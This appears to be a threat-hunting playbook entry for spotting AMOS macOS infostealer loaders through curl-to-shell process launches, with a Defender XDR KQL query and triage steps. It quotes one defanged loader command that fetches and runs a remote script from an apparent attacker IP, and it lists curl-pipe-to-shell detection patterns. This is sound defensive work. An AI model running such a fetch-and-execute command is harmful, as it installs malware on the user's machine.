# H1 — curl-to-shell first-stage loader on macOS endpoints

## Frame

Prepare-Execute-Act-Know hunt. The AMOS delivery chains (OpenClaw skill,
ClickFix, cracked-app) almost all funnel through a single observable: a Unix
shell invoked with `-c` whose command line fetches and pipes a remote script,
e.g. `/bin/bash -c "$(curl -fsSL hxxp://91.92.242.30/<16char>)"`. Any SOC with
macOS process telemetry (Defender for Endpoint `DeviceProcessEvents`, Jamf
Protect, or ES exec events) can hunt this without extra instrumentation.

## Hypothesis

If an AMOS loader executed on a Mac in our fleet, we will observe a `bash`,
`sh`, or `zsh` process launched with `-c` whose command line contains a `curl`
download (`-fsSL` / `$(curl` / `| bash`) to a host outside our known-good
install-domain allowlist.

## Expected benign baseline

Developer bootstrap installers (Homebrew, rustup, nvm, Deno) legitimately use
`curl ... | bash`, but to a small set of well-known domains
(`brew.sh`, `raw.githubusercontent.com`, `sh.rustup.rs`, `nodejs.org`). Anything
to a bare IP or a random `*.vercel.app` / 16-character path is anomalous.

## Action on match

Pull the full process tree and the parent (terminal vs AI-agent helper vs
installer), resolve the destination host against the AMOS indicators, capture
any `/tmp/*.zip` staging archive, and pivot to H2 (osascript + Keychain) and H3
(C2 egress) on the same host.

## Query — Defender XDR

```kql
DeviceProcessEvents
| where Timestamp > ago(14d)
| where FileName in~ ("bash", "sh", "zsh")
| where ProcessCommandLine has "-c" and ProcessCommandLine has "curl"
| where ProcessCommandLine has_any ("| bash", "|bash", "| sh", "| zsh", "$(curl", "-fsSL", "-sSL")
| extend DestHost = extract(@"https?://([^/\s""')]+)", 1, ProcessCommandLine)
| where DestHost !has_any ("brew.sh", "githubusercontent.com", "sh.rustup.rs", "nodejs.org")
| summarize Hits = count(), Hosts = make_set(DestHost, 10), Cmds = make_set(ProcessCommandLine, 10)
    by DeviceName, AccountName, InitiatingProcessFileName
| order by Hits desc
```

## Notes

The destination-host allowlist is environment-specific — tune it from your own
known-good developer-bootstrap traffic before running fleet-wide, or the
Homebrew/rustup baseline will dominate the results.
